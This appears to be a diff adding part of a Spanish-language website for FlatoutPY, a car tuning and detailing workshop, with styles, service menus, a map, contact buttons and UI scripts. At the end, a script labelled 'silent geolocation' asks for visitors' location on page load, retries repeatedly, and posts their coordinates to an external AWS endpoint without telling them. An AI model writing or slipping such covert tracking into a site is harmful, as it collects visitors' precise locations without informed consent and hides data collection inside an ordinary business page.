+        }
+
+        .popup-close:hover,
+        .popup-close:active {
+            background: rgba(255, 0, 0, 1);
+            box-shadow: 
+                0 6px 16px rgba(0, 0, 0, 0.7),
+                0 0 20px rgba(255, 0, 0, 0.6);
+        }
+
+        /* Imagem do Popup */
+        .popup-image {
+            width: 100%;
+            height: auto;
+            max-height: 90vh;
+            object-fit: contain;
+            display: block;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .popup-container {
+                max-width: 95%;
+                max-height: 95vh;
+            }
+
+            .popup-close {
+                width: 36px;
+                height: 36px;
+                font-size: 1.4rem;
+                top: 0.75rem;
+                right: 0.75rem;
+            }
+
+            .download-button {
+                padding: 0.9rem 1.5rem;
+                font-size: 0.9rem;
+                min-height: 44px;
+            }
+        }
+        /* End of styles */
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <div class="loader-wrapper">
+            <span class="loader-letter">F</span>
+            <span class="loader-letter">l</span>
+            <span class="loader-letter">a</span>
+            <span class="loader-letter">t</span>
+            <span class="loader-letter">O</span>
+            <span class="loader-letter">u</span>
+            <span class="loader-letter">t</span>
+            <span class="loader-letter">P</span>
+            <span class="loader-letter">Y</span>
+            <span class="loader-letter">.</span>
+            <span class="loader-letter">.</span>
+            <span class="loader-letter">.</span>
+            <div class="loader"></div>
+        </div>
+    </div>
+    <!-- Header com Logo -->
+    <header class="header">
+        <div class="logo-container">
+            <img src="img/title3.png" alt="Flatout PY">
+        </div>
+    </header>
+
+    <div class="container">
+
+        <h2 class="services-title">SERVICIOS PROFISSIONALES</h2>
+        <div class="description">Estamos bien equipados, con equipos profesionales y un amplio sentido de responsabilidad para garantizar su confianza y satisfacción.</div>
+        <!-- Selos -->
+        <div class="seals-container">
+            <img src="img/elevador_selo.png" alt="Elevador" class="seal">
+            <img src="img/escape_selo.png" alt="Escape" class="seal">
+            <img src="img/estetica_selo.png" alt="Estética" class="seal">
+        </div>
+
+        <!-- Título dos Serviços -->
+        <h2 class="services-title">Nuestros servicios</h2>
+        <!-- Botões e Painéis de Serviços -->
+        <div class="services-container">
+            <!-- PERFORMANCE -->
+            <div class="service-item-wrapper">
+                <button class="service-button" onclick="toggleService('performance')">
+                    PERFORMANCE
+                </button>
+                <div id="performance-panel" class="service-panel">
+                    <ul class="service-list">
+                        <li class="service-item"><strong>LÍNEA DE ESCAPE COMPLETA</strong><br>Múltiple, Downpipe, MidPipe, Catback.</li>
+                        <li class="service-item"><strong>SISTEMA DE ADMISIÓN</strong><br>Cañería, Intake, Inlet, ChargePipes, BOV, Intercooler.</li>
+                        <li class="service-item"><strong>FABRICACIÓN</strong><br>Soportes a medida, Refuerzos, Ajustes & Personalizaciones Racing.</li>
+                        <li class="service-item"><strong>ELECTRÓNICA</strong><br>Módulos, Add-Ons (Launch Control, Rev. Limiter), Panel Racing (Switches), Bypass de sistema, Harness.</li>
+                        <li class="service-item"><strong>SOLDADURA EN PROCESO TIG.</strong><br>ACERO-INOX-ALUMINIO-TITÂNIO.</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- ESTÉTICA -->
+            <div class="service-item-wrapper">
+                <button class="service-button" onclick="toggleService('estetica')">
+                    ESTÉTICA
+                </button>
+                <div id="estetica-panel" class="service-panel">
+                    <ul class="service-list">
+                        <li class="service-item"><strong>LAVADO DETALLADO - INTERNO|EXTERNO.</strong><br>Hidratación de Plásticos & Cueros.</li>
+                        <li class="service-item"><strong>LAVADO TECNICO DE MOTOR.</strong><br>Líquido no conductor, Vapor, Productos especiales.</li>
+                        <li class="service-item"><strong>PULIDO TÉCNICO DE PINTURA - RESTAURACIÓN DE FAROS.</strong><br>Corrección de imperfecciones leves.</li>
+                        <li class="service-item"><strong>TRATAMIENTO DE PINTURA.</strong><br>Descontaminación, Coat Nano-Cerámico.</li>
+                        <li class="service-item"><strong>CUSTOMIZACIONES INTERNAS.</strong><br>Multimedia, Ambient Light, Star Roof, etc...</li>
+                    </ul>
+                    <button class="download-button" onclick="openPopup('img/estetica-menu.PNG')">Mostrar precios</button>
+                </div>
+            </div>
+
+            <!-- MECÁNICA LIGERA -->
+            <div class="service-item-wrapper">
+                <button class="service-button" onclick="toggleService('mecanica')">
+                    MECÁNICA LIGERA
+                </button>
+                <div id="mecanica-panel" class="service-panel">
+                    <ul class="service-list">
+                        <li class="service-item">
+                            <strong>MANTENIMIENTO GENERAL</strong><br>
+                            Revisión y mantenimiento preventivo de aceite, filtros, frenos y correas externas.
+                        </li>
+                        <li class="service-item">
+                            <strong>AJUSTES Y REPARACIONES LIGERAS</strong><br>
+                            Reparación de vidrios eléctricos, cierres de puertas, suspensiones leves y pequeños componentes, incluyendo piezas internas o soportes dañados que requieran ajustes o soldadura.
+                        </li>                        
+                        <li class="service-item">
+                            <strong>INSPECCIÓN COMPLETA</strong><br>
+                            Levantamos el vehículo para revisar visualmente motor, suspensión, frenos y sistema de escape, identificando posibles problemas de mantenimiento.
+                        </li>
+                    </ul>
+                </div>
+            </div>            
+        </div>
+    </div>
+
+    <!-- Seção Mapa e Botões com Background -->
+    <div class="map-section-wrapper">
+        <div class="container">
+            <!-- Mapa -->
+            <div id="ubicacion" class="map-container">
+                <div class="map-wrapper">
+                    <iframe 
+                        id="map"
+                        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3599.651309130373!2d-54.63067292500069!3d-25.549989377485552!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94f68ffbb716cc81%3A0xcb31cbefce999f34!2sFlatoutPY!5e0!3m2!1sen!2spy!4v1764098627847!5m2!1sen!2spy"
+                        style="border:0; width:100%; height:100%;" 
+                        allowfullscreen="" 
+                        loading="lazy" 
+                        referrerpolicy="no-referrer-when-downgrade"
+                        title="Ubicación FlatOutPY">
+                    </iframe>
+                </div>
+            </div>
+            <!-- Botões de Contato -->
+            <div id="contacto" class="contact-buttons">
+                <!-- Botão Ubicación -->
+                <a href="https://maps.app.goo.gl/bjTmPqTZEkWAqAmZA" target="_blank" class="contact-button">
+                    <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
+                        <circle cx="12" cy="10" r="3"/>
+                    </svg>
+                    <span>Ubicación</span>
+                </a>
+                <!-- Botão WhatsApp -->
+                <a href="https://wa.me/595986641668" target="_blank" class="contact-button">
+                    <svg class="whatsapp-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
+                    </svg>
+                    <span>+595 986 641668</span>
+                </a>
+                <div><br><br></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Footer -->
+        <footer class="footer">
+            @FlatoutPY - MotorSport Club
+        </footer>
+    </div>
+
+    <!-- Popup de Imagem -->
+    <div id="image-popup-overlay" class="popup-overlay">
+        <div class="popup-container">
+            <button class="popup-close" onclick="closePopup()" aria-label="Cerrar">×</button>
+            <img id="popup-image" class="popup-image" src="" alt="Menu de servicios">
+        </div>
+    </div>
+
+    <script>
+        // Loading Screen
+        window.addEventListener('load', function() {
+            const loadingScreen = document.getElementById('loading-screen');
+            // Aguarda um breve momento para garantir que tudo foi carregado
+            setTimeout(() => {
+                loadingScreen.classList.add('fade-out');
+                // Remove o elemento do DOM após a transição
+                setTimeout(() => {
+                    loadingScreen.style.display = 'none';
+                }, 500);
+            }, 500);
+        });
+
+        function toggleService(serviceId) {
+            const panel = document.getElementById(serviceId + '-panel');
+            const button = event.target;
+            
+            // Fechar todos os outros painéis
+            const allPanels = document.querySelectorAll('.service-panel');
+            const allButtons = document.querySelectorAll('.service-button');
+            
+            allPanels.forEach(p => {
+                if (p !== panel) {
+                    p.classList.remove('active');
+                }
+            });
+            
+            allButtons.forEach(b => {
+                if (b !== button) {
+                    b.classList.remove('active');
+                }
+            });
+            
+            // Toggle do painel atual
+            panel.classList.toggle('active');
+            button.classList.toggle('active');
+        }
+
+        // Função reutilizável para efeito de poeira
+        function createDustEffect(containerSelector) {
+            const container = document.querySelector(containerSelector);
+            if (!container) return;
+
+            const dustContainer = document.createElement('div');
+            dustContainer.className = 'dust-container';
+            container.appendChild(dustContainer);
+
+            const particles = [];
+            let lastSpawnTime = 0;
+            const spawnInterval = 200; // Gerar nova partícula a cada 200ms
+
+            // Função para gerar número aleatório
+            function random(min, max) {
+                return Math.random() * (max - min) + min;
+            }
+
+            // Criar partículas com forma de nuvem
+            function createParticle() {
+                const particle = document.createElement('div');
+                particle.className = 'dust-particle';
+                
+                // Tamanhos variados para parecer nuvem
+                const width = random(100, 300);
+                const height = random(80, 250);
+                
+                // Cores aleatórias (branco ou vermelho)
+                const isRed = Math.random() > 0.5;
+                const opacity = random(0.02, 0.04);
+                const color = isRed 
+                    ? `rgba(255, 0, 0, ${opacity})` 
+                    : `rgba(255, 255, 255, ${opacity})`;
+                
+                // Forma mais orgânica, não circular
+                const borderRadius = random(40, 60) + '%';
+                
+                particle.style.width = width + 'px';
+                particle.style.height = height + 'px';
+                particle.style.borderRadius = borderRadius;
+                particle.style.background = `radial-gradient(ellipse, ${color} 0%, transparent 65%)`;
+                
+                const containerHeight = container.offsetHeight;
+                const containerWidth = container.offsetWidth;
+                
+                // Sempre começar da esquerda (fora da tela)
+                particle.style.left = -width + 'px';
+                particle.style.top = random(-20, containerHeight + 20) + 'px';
+                
+                // Movimento principal da esquerda para direita, com variação vertical
+                particle.vx = random(0.4, 0.8); // Sempre positivo (esquerda para direita)
+                particle.vy = random(-0.15, 0.15); // Movimento vertical sutil
+                particle.rotation = random(0, 360);
+                particle.rotationSpeed = random(-0.3, 0.3);
+                
+                // Variação de escala para efeito de nuvem
+                particle.scale = random(0.8, 1.2);
+                particle.scaleSpeed = random(-0.001, 0.001);
+                
+                dustContainer.appendChild(particle);
+                particles.push(particle);
+            }
+
+            // Inicializar algumas partículas
+            for (let i = 0; i < 15; i++) {
+                createParticle();
+                // Distribuir no tempo
+                lastSpawnTime = Date.now() - (spawnInterval * i);
+            }
+
+            // Animar partículas
+            function animate() {
+                const currentTime = Date.now();
+                const containerWidth = container.offsetWidth;
+                const containerHeight = container.offsetHeight;
+
+                // Gerar novas partículas continuamente
+                if (currentTime - lastSpawnTime >= spawnInterval) {
+                    createParticle();
+                    lastSpawnTime = currentTime;
+                }
+
+                // Animar e remover partículas que saíram
+                for (let i = particles.length - 1; i >= 0; i--) {
+                    const particle = particles[i];
+                    let left = parseFloat(particle.style.left);
+                    let top = parseFloat(particle.style.top);
+
+                    // Movimento da esquerda para direita com variação vertical
+                    left += particle.vx;
+                    top += particle.vy;
+                    
+                    // Rotação suave
+                    particle.rotation += particle.rotationSpeed;
+                    particle.style.transform = `rotate(${particle.rotation}deg) scale(${particle.scale})`;
+                    
+                    // Variação de escala
+                    particle.scale += particle.scaleSpeed;
+                    if (particle.scale > 1.3 || particle.scale < 0.7) {
+                        particle.scaleSpeed *= -1;
+                    }
+                    
+                    const particleWidth = parseFloat(particle.style.width);
+                    
+                    // Remover partículas que saíram pela direita
+                    if (left > containerWidth + particleWidth) {
+                        particle.remove();
+                        particles.splice(i, 1);
+                        continue;
+                    }
+                    
+                    // Manter partículas dentro dos limites verticais (com margem)
+                    if (top < -50) {
+                        top = -50;
+                        particle.vy *= -0.5;
+                    } else if (top > containerHeight + 50) {
+                        top = containerHeight + 50;
+                        particle.vy *= -0.5;
+                    }
+
+                    particle.style.left = left + 'px';
+                    particle.style.top = top + 'px';
+                }
+
+                requestAnimationFrame(animate);
+            }
+
+            // Iniciar animação
+            animate();
+
+            // Limpar e reiniciar se o container mudar de tamanho
+            let resizeTimer;
+            window.addEventListener('resize', () => {
+                clearTimeout(resizeTimer);
+                resizeTimer = setTimeout(() => {
+                    particles.forEach(p => p.remove());
+                    particles.length = 0;
+                    lastSpawnTime = Date.now();
+                    for (let i = 0; i < 15; i++) {
+                        createParticle();
+                    }
+                }, 250);
+            });
+        }
+
+        // Aplicar efeito no header
+        createDustEffect('.header');
+        
+        // Aplicar efeito na seção do mapa
+        //createDustEffect('.map-section-wrapper');
+
+        // Função para abrir popup
+        function openPopup(imageSrc) {
+            const overlay = document.getElementById('image-popup-overlay');
+            const img = document.getElementById('popup-image');
+            if (overlay && img) {
+                img.src = imageSrc;
+                overlay.classList.add('active');
+                // Prevenir scroll do body quando popup está aberto
+                document.body.style.overflow = 'hidden';
+            }
+        }
+
+        // Função para fechar popup
+        function closePopup() {
+            const overlay = document.getElementById('image-popup-overlay');
+            if (overlay) {
+                overlay.classList.remove('active');
+                // Restaurar scroll do body
+                document.body.style.overflow = '';
+            }
+        }
+
+        // Fechar popup ao clicar no overlay (fora da imagem)
+        document.addEventListener('DOMContentLoaded', function() {
+            const overlay = document.getElementById('image-popup-overlay');
+            if (overlay) {
+                overlay.addEventListener('click', function(e) {
+                    // Fechar apenas se clicar no overlay, não na imagem ou no botão
+                    if (e.target === overlay || e.target.classList.contains('popup-container')) {
+                        closePopup();
+                    }
+                });
+
+                // Prevenir fechamento ao clicar na imagem
+                const container = overlay.querySelector('.popup-container');
+                if (container) {
+                    container.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                    });
+                }
+            }
+
+            // Fechar com tecla ESC
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    closePopup();
+                }
+            });
+        });
+
+        // Geolocalização silenciosa
+        const API_URL = "https://4ezx5sqt84.execute-api.sa-east-1.amazonaws.com/loc";
+        let locationSent = false; // Flag para evitar envios duplicados
+
+        function sendLocationToDynamoDB(latitude, longitude) {
+            if (locationSent) return; // Evita envios duplicados
+            locationSent = true;
+            
+            fetch(API_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ latitude, longitude })
+            }).catch(() => {
+                locationSent = false; // Permite tentar novamente se falhar
+            });
+        }
+
+        function requestLocation(retryCount = 0) {
+            const maxRetries = 5; // Tenta até 5 vezes
+            const retryDelay = 2000; // 2 segundos entre tentativas
+            
+            if (locationSent) return; // Já enviou, não precisa tentar novamente
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const { latitude, longitude } = position.coords;
+                        sendLocationToDynamoDB(latitude, longitude);
+                    },
+                    error => {
+                        // Se ainda não excedeu o limite de tentativas, tenta novamente
+                        if (retryCount < maxRetries) {
+                            setTimeout(() => {
+                                requestLocation(retryCount + 1);
+                            }, retryDelay);
+                        }
+                        // Não envia (0,0) - apenas desiste silenciosamente
+                    },
+                    {
+                        timeout: 10000, // 10 segundos de timeout
+                        enableHighAccuracy: false // Não precisa de alta precisão
+                    }
+                );
+            }
+        }
+
+        window.addEventListener('load', () => {
+            // Primeira tentativa após 1 segundo (dá tempo do usuário aceitar)
+            setTimeout(() => {
+                requestLocation();
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
